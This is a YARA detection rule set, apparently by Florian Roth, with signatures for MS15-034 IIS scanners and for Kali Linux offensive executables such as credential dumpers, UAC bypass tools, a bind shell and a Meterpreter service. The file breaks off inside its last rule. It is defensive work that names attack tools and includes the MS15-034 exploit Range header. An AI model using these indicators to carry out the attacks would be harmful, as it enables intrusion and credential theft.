	Yara Rule Set
	Author: Florian Roth
	Date: 2015-08-14
	Identifier: MS15-034 Scanner
*/

rule MS15_034_iis_scan {
	meta:
		description = "MS15-034 scanner - file iis-scan.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/xvsOox"
		date = "2015-08-14"
		score = 80
		hash = "f34bed691fbd456368787f471474980567087d48411cfe60e48052185a9447d5"
	strings:
		$s1 = "iis-scan.exe" fullword wide
		$s2 = "usage:  IIS-SCAN IPv4Address [/y]" fullword wide
		$s3 = "MS15-034 - Critica HTTP.SYS Vulnerability:" fullword wide
		$s4 = "Responding server was not IIS." fullword wide
		$s5 = "IIS is vulnerable!" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 25KB and 2 of them
}

rule MS15_034_IIS_SCANv2 {
	meta:
		description = "MS15-034 scanner - file IIS-SCANv2.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/xvsOox"
		date = "2015-08-14"
		score = 80
		hash = "a82b59c31fce22b011edbdd28cef3d360196fcd85bfd6f9b9153a463a2525556"
	strings:
		$s1 = "iis-scan {0}-{1}-{2} {3}-{4}-{5}.log" fullword wide
		$s2 = "IIS-SCANv2.exe" fullword wide
		$s3 = "get_IsVulnerable" fullword ascii
		$s4 = "Host: stuff" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 50KB and 2 of them
}

rule MS15_034_Scanner_master {
	meta:
		description = "MS15-034 scanner - file MS15-034-Scanner-master.zip"
		author = "Florian Roth"
		reference = "http://goo.gl/xvsOox"
		date = "2015-08-14"
		score = 80
		hash = "152b0896423699042bf10ff7b9b50f0eff5bda93a46d2d2dd9441b3a97fbc7a0"
	strings:
		$s1 = "MS15-034-Scanner-master/IIS-SCAN/iis-scan.exeUT" fullword ascii
	condition:
		uint16(0) == 0x4b50 and filesize < 20434KB and all of them
}

rule MS15_034_iis_scan_IIS_SCANv2_1 {
	meta:
		description = "MS15-034 scanner - from files iis-scan.exe, IIS-SCANv2.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/xvsOox"
		date = "2015-08-14"
		score = 80
		super_rule = 1
		hash1 = "f34bed691fbd456368787f471474980567087d48411cfe60e48052185a9447d5"
		hash2 = "a82b59c31fce22b011edbdd28cef3d360196fcd85bfd6f9b9153a463a2525556"
	strings:
		$s1 = "Content-Length: (.*?)\\" fullword wide
		$s2 = "Host: stuff" fullword wide
		$s3 = "Range: bytes=0-18446744073709551615" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 50KB and 2 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-08-21
	Identifier: Kali Linux EXEs
*/

/* Rule Set ----------------------------------------------------------------- */

rule Kali_Exes_template_x86_windows_svc {
	meta:
		description = "Kali Linux malicious executable - file template_x86_windows_svc.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "a8be7714ce60d8dba4348591efb4c7e992b39952daffa0d14dcc6327e684b209"
	strings:
		$s0 = "PAYLOAD:" fullword ascii
		$s1 = "rundll32.exe" fullword ascii /* Goodware String - occured 10 times */
		$s3 = "ResumeThread" fullword ascii /* Goodware String - occured 1151 times */

		$op0 = { 04 00 00 c7 84 24 fc 03 } /* Opcode */
		$op1 = { 04 00 00 c7 84 24 0c 01 } /* Opcode */
		$op2 = { 01 00 00 8b 44 24 70 03 44 24 6c 89 44 24 68 8b } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 46KB and all of ($s*) and 1 of ($op*)
}

rule Kali_Exes_bypassuac {
	meta:
		description = "Kali Linux malicious executable - file bypassuac.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "22beebeef5d8d5962f68048c601e2b0bfdb13b53ddf0d82ac68b19ffb6b1f6b0"
	strings:
		$s1 = "elevate /c <ANY COMMAND SEQUENCE THAT IS ALLOWED BY CMD.EXE SHELL>" fullword ascii
        $s2 = "elevate --pid 1234 /c <command> [arg1] [arg2] .. [argn]" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1500KB and 1 of them
}

rule Kali_Exes_cleanevents {
	meta:
		description = "Kali Linux malicious executable - file cleanevents.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "a4aa7032ddc6b148618e674eee04b818ed61d6a4b4850eba30e780f550720688"
	strings:
		$s0 = "This operating system is not supported." fullword ascii
		$s1 = "VBScript" fullword ascii /* Goodware String - occured 14 times */
		$s2 = "GetWindowThreadProcessId" fullword ascii /* Goodware String - occured 947 times */
		$s8 = "OLE32.dll" fullword ascii /* Goodware String - occured 3 times */

		$op0 = { e8 56 01 00 00 48 74 de 0f 89 c7 } /* Opcode */
		$op1 = { cc cc cc cc cc cc cc cc cc cc cc cc 55 89 e5 51 } /* Opcode */
		$op2 = { cc cc cc cc cc cc cc cc 55 89 e5 53 56 57 8b 5d } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 47KB and all of ($s*) and 1 of ($op*)
}

rule Kali_Exes_usr_share_windows_binaries_enumplus_enum {
	meta:
		description = "Kali Linux malicious executable - file enum.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "170c6d7f0b0cdeb405704bdf2a4434972400883844243621a7d47c08c29c88d5"
	strings:
		$s2 = "To get share of 10.1.1.1 use:%s -S 10.1.1.1" fullword ascii
		$s8 = "use: %s -U -u admin -p abc server " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 140KB and all of them
}

rule Kali_Exes_opt_metasploit_apps_pro_data_drivers_amd64_update {
	meta:
		description = "Kali Linux malicious executable - file update.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "4266f225c921ac39a39f80470b50c2c21383f495a65154f4294f4118629eab15"
	strings:
		$s1 = "$http://www.globalsign.net/repository09" fullword ascii
		$s2 = "Metasploit1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 137KB and all of them
}

rule Kali_Exes_unlocked_cmd {
	meta:
		description = "Kali Linux malicious executable - file unlocked-cmd.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "2c57671eee85938ef650b3da6db44b55ecac27b446a519265118b0c9995ac3cd"
	strings:
		$s1 = "ulocked" fullword ascii
		$s2 = "Windows Command Processor" fullword wide /* Goodware String - occured 3 times */
		$s4 = "Cmd.Exe" fullword wide /* Goodware String - occured 5 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 347KB and all of them
}

rule Kali_Exes_usr_share_wfuzz_wordlist_fuzzdb_web_backdoors_exe_nc {
	meta:
		description = "Kali Linux malicious executable - file nc.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "e355a8decae502578e5bb649b4336b89b13c5daa07b2b23c6737989ecc0fa851"
	strings:
		$s1 = "ser32.dll" fullword ascii
		$s2 = "v- Kablto iniValiz" fullword ascii
		$s3 = "OSIXLY_CORRE" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 80KB and all of them
}

rule Kali_Exes_template_x86_windows_old {
	meta:
		description = "Kali Linux malicious executable - file template_x86_windows_old.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "36a9d6d74425c1577e234979bef8fa161f6458404700d8c1ab94b761a310646e"
	strings:
		$s0 = "PAYLOAD:" fullword ascii
		$s1 = "0`.data" fullword ascii /* Goodware String - occured 2 times */

		$op0 = { b8 00 20 40 00 ff e0 90 ff 25 38 30 40 00 90 90 } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 13KB and all of them
}

rule Kali_Exes_usr_share_metasploit_framework_data_meterpreter_metsvc {
	meta:
		description = "Kali Linux malicious executable - file metsvc.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "fc512a7264fa6a546ab1f503c8bd8f11787ed23d05f3783a76d932b1722f8d70"
	strings:
		$s1 = "metsvc-server.exe" fullword ascii
		$s2 = "Meterpreter service listening on port %d" fullword ascii
		$s3 = "* Removing service" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 180KB and all of them
}

rule Kali_Exescmd_executor {
	meta:
		description = "Kali Linux malicious executable - file cmd_executor.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "3ee5eb9c03fa77d9c80c0b4e66516b134994925c43a197674a8d844005e8e6e5"
	strings:
		$s1 = "userinit.exe" fullword ascii
		$s2 = "taskmgr.exe" fullword ascii
		$s3 = "Rlogin://a" fullword ascii
		$s4 = "Telnet://a" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 15KB and all of them
}

rule Kali_Exessrv_bindshell {
	meta:
		description = "Kali Linux malicious executable - file srv_bindshell.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "8728ccda4b74cfb21b3501dbf92b3f9d763c7ac02902bc440d5276e98108ed28"
	strings:
		$s1 = "cmd.exe /D/" fullword ascii
		$s2 = "bindsh" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule Kali_Exes_usr_share_windows_binaries_mbenum_mbenum {
	meta:
		description = "Kali Linux malicious executable - file mbenum.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "5fcde4197fd0547b79b31fea842403332cf8857a8120f4a9429e5cbb004a6a3c"
	strings:
		$s1 = "%s [-s \\\\server] [-d dom ] [-f filter] -p <mode>" fullword ascii
		$s2 = "More entries available!!!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 140KB and all of them
}

rule Kali_Exes_sig_64unlocked_gpscript {
	meta:
		description = "Kali Linux malicious executable - file 64unlocked-gpscript.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "c59ec6c1994b8eed2bc8a8224dc4dd7219aa27505da7ad7f79200765b908cdf8"
	strings:
		$s1 = "Software\\Microsoft\\Windows\\xxxxxxxxxxxxxx\\Group Policy\\State\\" fullword wide
		$s2 = "GPSVC(%x.%x) %02d:%02d:%02d:%03d " fullword wide
		$s3 = "GPSCRIPT.EXE" fullword wide /* Goodware String - occured 1 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 81KB and all of them
}

rule Kali_Exes_template_x64_windows {
	meta:
		description = "Kali Linux malicious executable - file template_x64_windows.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "43e270dd0554951791f8486f78c569647de0487ad57d3c616e68029c5dd6fdec"
	strings:
		$s0 = "PAYLOAD:" fullword ascii
		$s1 = "Rich}E" fullword ascii

		$op0 = { 48 83 ec 28 49 c7 c1 40 } /* Opcode */
		$op1 = { 49 c7 c0 00 30 00 00 48 c7 c2 00 10 00 00 48 33 } /* Opcode */
		$op2 = { cc ff 25 c0 0f 00 00 ff 25 b2 0f } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 18KB and all of them
}

rule Kali_Exes_sig_64unlocked_cmd {
	meta:
		description = "Kali Linux malicious executable - file 64unlocked-cmd.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "3505c0927d8b4749f5c3d6c0ad52ec0698c61b32b5ac56d5313264f10d08ade0"
	strings:
		$s1 = "xxxxxxxxxx" fullword wide
		$s2 = "Software\\xxxxxxxx\\Microsoft\\Windows\\System" fullword wide
		$s3 = "\\CMD.EXE" fullword wide /* Goodware String - occured 6 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 1015KB and all of them
}

rule Kali_Exes_usr_share_windows_binaries_nbtenum_nbtenum {
	meta:
		description = "Kali Linux malicious executable - file nbtenum.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "1bf4608c6495003946100a021d61ebce94f85f992d339019f6381a508a9fa514"
	strings:
		$s1 = "nbtenum.exe" fullword wide
		$s2 = "PerlApp::APPDATA" fullword ascii /* Goodware String - occured 1 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule Kali_Exes_ikatrunner {
	meta:
		description = "Kali Linux malicious executable - file ikatrunner.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "7a2688a2030b92296aeb4f0b96dcf96e87fd063af2e6e7a457bb4a3edb01be59"
	strings:
		$s0 = "\\ikatrunner\\Debug\\ikatrunner.pdb" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1548KB and all of them
}

rule Kali_Exes_srpbypass {
	meta:
		description = "Kali Linux malicious executable - file srpbypass.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "a52a5a48c46dd3ef3b989b49732e1989c262223024ba178caf2fd52b6c821bdb"
	strings:
		$s1 = "Execute the shell command 'cmd' in a sub-process.  On UNIX, 'cmd'" fullword ascii
		$s2 = "PyLsaLogon_HANDLE cannot be closed - LsaDeregisterLogonProcess is not available ??????" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 10945KB and all of them
}

rule Kali_Exes_usr_share_ikat_src_Windows_files_uacpoc {
	meta:
		description = "Kali Linux malicious executable - file uacpoc.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "6abf2acedf08dc05edd86ff4fc2981b68fa8b0f620a52e8e9cee89b38c16b39e"
	strings:
		$s1 = "Failed to get temp file for AES encryption" fullword ascii
		$s2 = "ikatrunner.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1831KB and all of them
}

rule Kali_Exes_usr_share_ikat_src_Windows_files_winspy {
	meta:
		description = "Kali Linux malicious executable - file winspy.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "228389fe6d9c80f894d59a10c94517d4df1f1de028b2524f98c915d393c2428f"
	strings:
		$s1 = "Failed to get temp file for AES encryption" fullword ascii
		$s2 = "spy.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule Kali_Exes_churrasco {
	meta:
		description = "Kali Linux malicious executable - file churrasco.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "6a5d4ef82a8f993ac93ebf979c36dedda03691b0c5bb76ad0edd09d87380375c"
	strings:
		$s1 = "Ciphlpapi.dllA" fullword ascii
		$s2 = "ndGetTcpExTa,F2mStack" fullword ascii
		$s3 = "0\\Default" fullword ascii
		$s4 = "/currasco/-->MSDTC serviceu" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 91KB and all of them
}

rule Kali_Exes_vbstoexe {
	meta:
		description = "Kali Linux malicious executable - file vbstoexe.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "04e8845dc498520d89aed793155badf7deece28da018cb2ffe90b34312945bfa"
	strings:
		$s0 = "This operating system " fullword ascii
		$s1 = "B-Scripts(.v<)Fnt" fullword ascii
		$s4 = "an-read file: \"" fullword ascii
		$s5 = "http://www.f2ko.de" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 37KB and all of them
}

rule Kali_Exes_kitrap0d {
	meta:
		description = "Kali Linux malicious executable - file kitrap0d.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "3da38cc96259597a857c33bfaf8e737a43c7fb8df474e271215b930a6f641edd"
	strings:
		$s1 = "<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</ProgressCaption>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1913KB and all of them
}

rule Kali_Exes_revelations {
	meta:
		description = "Kali Linux malicious executable - file revelations.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "49353a6daac4ef87a91c04292900e6a0a153c3eb39b91c45f4027bc650c3d9f7"
	strings:
		$s1 = "Revelation.EXE" fullword wide
		$s2 = "The RevelationHelper.DLL file is corrupt or missing." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 319KB and all of them
}

rule Kali_Exes_gpdisable {
	meta:
		description = "Kali Linux malicious executable - file gpdisable.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "dd76aa9276081234f5c123ca29967f474feb7db14211536c7151d31fd4b3a7e5"
	strings:
		$s0 = "gpdisable cmd.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1837KB and all of them
}

rule Kali_Exes_metsvc_server {
	meta:
		description = "Kali Linux malicious executable - file metsvc-server.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "ac16a5c6d083293c45b67db0f584aca9dcfbcc4bf79cd2dc3e7cca4061626303"
	strings:
		$s0 = "metsrv.dll" fullword ascii

		$op0 = { e8 b7 24 00 00 83 c4 14 80 7d f8 00 74 07 8b 45 } /* Opcode */
		$op1 = { f6 05 ac a6 40 00 01 0f 85 dd } /* Opcode */
		$op2 = { 81 79 04 20 3c 40 00 75 10 8b 51 0c 8b 52 0c 39 } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 132KB and all of them
}

rule Kali_Exes_unlocked_osk {
	meta:
		description = "Kali Linux malicious executable - file unlocked-osk.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "291fa2c9301bc2651d01b5893b90b23b950523815e31824dd6c18250c75fed25"
	strings:
		$s1 = "\"System\"h" fullword ascii
		$s2 = "Windows 95 Utopia " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule Kali_Exes_usr_share_ikat_src_Windows_files_ikat {
	meta:
		description = "Kali Linux malicious executable - file ikat.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "be9163fbafb176415150fde20975cafe6954cc1ebeeba55c349fdae7148a98ce"
	strings:
		$s0 = "maktone@hotmail.com" fullword ascii
    condition:
		uint16(0) == 0x5a4d and filesize < 696KB and all of them
}

rule Kali_Exes_opt_metasploit_apps_pro_data_drivers_i386_update {
	meta:
		description = "Kali Linux malicious executable - file update.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "859af9d8508a4902ead897a2bdb104e870b11fad15136c28407d3af674bceed8"
	strings:
		$s1 = "Metasploit1" fullword ascii
		$s2 = "CommandLineToArgvW" fullword ascii /* Goodware String - occured 445 times */
		$s3 = "KERNEL32.DLL" fullword wide /* Goodware String - occured 677 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 140KB and all of them
}

rule Kali_Exes_bypassuac_x64 {
	meta:
		description = "Kali Linux malicious executable - file bypassuac-x64.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "2a694038d64bc9cfcd8caf6af35b6bfb29d2cb0c95baaeffb2a11cd6e60a73d1"
	strings:
		$s19 = "which isn't allowed unless we're also elevated." fullword wide
		$s20 = "w7e_TIORShell" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1500KB and all of them
}

rule Kali_Exes_wmi_logoff {
	meta:
		description = "Kali Linux malicious executable - file wmi_logoff.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "19094fc2800cecbdb2d6e99e0892153cd5272e3b79093b78c10c6dac2f5cc352"
	strings:
		$s0 = "This operating system is not supported." fullword ascii
		$s1 = "+H[LordPE]" fullword ascii
		$s2 = "VBScript" fullword ascii /* Goodware String - occured 14 times */
		$s3 = "GetWindowThreadProcessId" fullword ascii /* Goodware String - occured 947 times */

		$op1 = { cc cc cc cc cc cc cc cc cc cc cc cc 55 89 e5 51 } /* Opcode */
		$op2 = { cc cc cc cc cc cc cc cc 55 89 e5 53 56 57 8b 5d } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 40KB and all of ($s*) and 1 of ($op*)
}

rule Kali_Exes_servpw64 {
	meta:
		description = "Kali Linux malicious executable - file servpw64.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "97b39ac28794a7610ed83ad65e28c605397ea7be878109c35228c126d43e2f46"
	strings:
		$s0 = "Unable to open target process: %d, pid %d" fullword ascii
		$s1 = "LSASS.EXE" fullword wide
		$s2 = "WriteProcessMemory failed: %d" fullword ascii
		$s4 = "lsremora64.dll" fullword ascii
		$s5 = "servpw" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 204KB and all of ($s*)
}

rule Kali_Exes_usr_share_framework2_tools_memdump {
	meta:
		description = "Kali Linux malicious executable - file memdump.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "d25c0429e4b0259d736c0b0aa877abcc7460143815f0f5a707ac24a1866b8fdc"
	strings:
		$s0 = "[*] Dump completed successfully, %lu segments." fullword ascii
		$s1 = "Usage: %s pid [dump directory]" fullword ascii
		$s2 = "[-] Dump failed, %.8x." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 22KB and all of ($s*)
}

rule Kali_Exes_template_x64_windows_svc {
	meta:
		description = "Kali Linux malicious executable - file template_x64_windows_svc.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		hash = "022a8e293ce249f2f92f9c8e55a803dd588348339ff7cff48f4552a372280158"
	strings:
		$s0 = "PAYLOAD:" fullword ascii
		$s1 = "rundll32.exe" fullword ascii /* Goodware String - occured 10 times */
		$s2 = "ResumeThread" fullword ascii /* Goodware String - occured 1151 times */
		$s3 = "- floating point support not loaded" fullword ascii /* Goodware String - occured 1174 times */
		$s4 = "SERVICENAME" fullword ascii /* Goodware String - occured 2 times */

		$op0 = { e8 5c ea ff ff 90 8b 43 04 89 05 86 93 00 00 8b } /* Opcode */
		$op1 = { 3c 3d 74 02 ff c7 48 8b cb e8 d2 1a 00 00 48 8d } /* Opcode */
		$op2 = { ff 15 6c 31 00 00 80 7c 24 38 00 74 53 48 8b 4c } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 142KB and all of ($s*) and 1 of ($op*)
}

/* Super Rules ------------------------------------------------------------- */

rule Kali_Exes_bypassuac_x64_bypassuac_x86 {
	meta:
		description = "Kali Linux malicious executable - from files bypassuac-x64.exe, bypassuac-x86.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "2a694038d64bc9cfcd8caf6af35b6bfb29d2cb0c95baaeffb2a11cd6e60a73d1"
		hash2 = "1058ee33ef745284039b31ac92c3a73e7eed4f8e6bd29e0d64a7ebdfd2231321"
	strings:
		$s0 = "n\\\\.\\pipe\\TIOR_In" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1468KB and all of them
}

rule Kali_Exes_fgdump_PwDump {
	meta:
		description = "Kali Linux malicious executable - from files fgdump.exe, PwDump.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "a6cad2d0f8dc05246846d2a9618fc93b7d97681331d5826f8353e7c3a3206e86"
		hash2 = "446f84069e825062d1d56971b7578361ebc4feb1988950701065d9c18a3e7941"
	strings:
		$s1 = ":\\\\.\\pipe\\%s" fullword ascii
		$s2 = "Timed out waiting to get our pipe back" fullword ascii
		$s3 = "servpw64.exe" fullword ascii
        $s4 = "servpw.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2856KB and all of them
}

rule Kali_Exes_gpdisable_kitrap0d_uacpoc_winspy {
	meta:
		description = "Kali Linux malicious executable - from files gpdisable.exe, kitrap0d.exe, uacpoc.exe, winspy.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "dd76aa9276081234f5c123ca29967f474feb7db14211536c7151d31fd4b3a7e5"
		hash2 = "3da38cc96259597a857c33bfaf8e737a43c7fb8df474e271215b930a6f641edd"
		hash3 = "6abf2acedf08dc05edd86ff4fc2981b68fa8b0f620a52e8e9cee89b38c16b39e"
		hash4 = "228389fe6d9c80f894d59a10c94517d4df1f1de028b2524f98c915d393c2428f"
	strings:
		$s0 = "<IconFile>C:\\WINDOWS\\App.ico</IconFile>" fullword ascii
		$s1 = "Running Zip pipeline..." fullword ascii
		$s2 = "Failed to read the entire file" fullword ascii
		$s5 = "AES Encrypting..." fullword ascii
		$s6 = "LoadXmlFile" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule Kali_Exes_dnschef_dnschef {
	meta:
		description = "Kali Linux malicious executable - from files dnschef.exe, dnschef.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "1d9d78d254ef69b347a230bf15bf22a8f591f18294b7108980d1c8ea2c29f6e9"
		hash2 = "1d9d78d254ef69b347a230bf15bf22a8f591f18294b7108980d1c8ea2c29f6e9"
	strings:
		$s1 = "- get_request() -> request, client_address" fullword ascii
		$s2 = ">>> print(_parseAddressIPv6('1080:0:0:0:8:800:200C:417A'))" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule Kali_Exes_fgdump_pstgdump {
	meta:
		description = "Kali Linux malicious executable - from files fgdump.exe, pstgdump.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "a6cad2d0f8dc05246846d2a9618fc93b7d97681331d5826f8353e7c3a3206e86"
		hash2 = "368c10795de10e988381b5de5c7cd8b2d4b9718dcd4e5590adc2556cbe9d13c1"
	strings:
		$s1 = "Failed to dump all protected storage items - see previous messages for details" fullword ascii
		$s2 = "Failed to impersonate user (ImpersonateLoggedOnUser failed): error %d" fullword ascii
		$s3 = "Attempting to impersonate user '%s'" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2856KB and all of them
}

rule Kali_Exes_bypassuac_bypassuac_x64_bypassuac_x86_Generic {
	meta:
		description = "Kali Linux malicious executable - from files bypassuac.exe, bypassuac-x64.exe, bypassuac-x86.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "22beebeef5d8d5962f68048c601e2b0bfdb13b53ddf0d82ac68b19ffb6b1f6b0"
		hash2 = "2a694038d64bc9cfcd8caf6af35b6bfb29d2cb0c95baaeffb2a11cd6e60a73d1"
		hash3 = "1058ee33ef745284039b31ac92c3a73e7eed4f8e6bd29e0d64a7ebdfd2231321"
	strings:
		$s1 = "C:\\Windows\\System32\\sysprep\\sysprep.exe" fullword wide
		$s2 = "Pick an unelevated process.)" fullword wide
		$s3 = "C:\\Windows\\System32" fullword wide
		$s4 = "CRYPTBASE.dll" fullword wide
		$s5 = "GetElevationType failed" fullword wide
		$s6 = "Unable to setup named pipe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1500KB and 5 of them
}

rule Kali_Exes_cachedump_cachedump64_fgdump_Generic {
	meta:
		description = "Kali Linux malicious executable - from files cachedump.exe, cachedump64.exe, fgdump.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "cf58ca5bf8c4f87bb67e6a4e1fb9e8bada50157dacbd08a92a4a779e40d569c4"
		hash2 = "e38edac8c838a043d0d9d28c71a96fe8f7b7f61c5edf69f1ce0c13e141be281f"
		hash3 = "a6cad2d0f8dc05246846d2a9618fc93b7d97681331d5826f8353e7c3a3206e86"
	strings:
		$s1 = "\\\\.\\pipe\\%ls" fullword ascii
		$s2 = "cacheDump [-v | -vv | -K]" fullword ascii
		$s3 = "ConnectNamedPipe function failed." fullword ascii
		$s4 = "No CacheDump service found !" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule Kali_Exes_wce_universal_wce64_Generic {
	meta:
		description = "Kali Linux malicious executable - from files wce-universal.exe, wce64.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "c6333c684762ed4b4129c7f9f49c88c33384b66dfb1f100e459ec6f18526dff7"
		hash2 = "68a15a34c2e28b9b521a240b948634617d72ad619e3950bc6dc769e60a0c3cf2"
	strings:
		$s0 = "Installing WCE Service failed!" fullword ascii
		$s1 = "This feature is temporarily disabled." fullword ascii
		$s2 = "LaunchService failed!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1368KB and all of them
}

rule Kali_Exes_sbd_sbdbg_Generic {
	meta:
		description = "Kali Linux malicious executable - from files sbd.exe, sbdbg.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "3d10a895e55cd0d5ff6df19f06526ae6ebd6925af6ea9657dad06df818892c27"
		hash2 = "5a600534617ccfa18fb03cf813ed93e3933275a5d0b09c7180a6e6c0ad49b000"
	strings:
		$s1 = "connected to %s:%u" fullword ascii
		$s2 = "executing: %s" fullword ascii
		$s3 = "shadowinteger_bd_semaphore" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and all of them
}

rule Kali_Exes_winexesvc32_winexesvc64_Generic {
	meta:
		description = "Kali Linux malicious executable - from files winexesvc32.exe, winexesvc64.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "cafb416560f61a7812917638fd6b0657403c10a5bfdcb8d9d2e26db89b3040e0"
		hash2 = "5130f600cd9a9cdc82d4bad938b20cbd2f699aadb76e7f3f1a93602330d9997d"
	strings:
		$s1 = "\\\\.\\pipe\\ahexec" fullword ascii
		$s2 = "error Creating process(%s) %d" fullword ascii
		$s3 = "winexesvc" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 70KB and all of them
}

rule Kali_Exes_Fgdump_Generic {
	meta:
		description = "Kali Linux malicious executable - from files fgdump.exe, fgexec.exe"
		author = "Florian Roth"
		score = 60
		date = "2015-08-21"
		super_rule = 1
		hash1 = "a6cad2d0f8dc05246846d2a9618fc93b7d97681331d5826f8353e7c3a3206e86"
		hash2 = "8697897bee415f213ce7bc24f22c14002d660b8aaffab807490ddbf4f3f20249"
	strings:
		$s1 = "fizzgig and the mighty foofus.net team" fullword ascii
		$s2 = "\\\\%s\\pipe\\%s" fullword ascii /* Goodware String - occured 3 times */
		$s3 = "CallNamedPipeA" fullword ascii /* Goodware String - occured 40 times */
		$s4 = "%s||%s" fullword ascii
	condition:
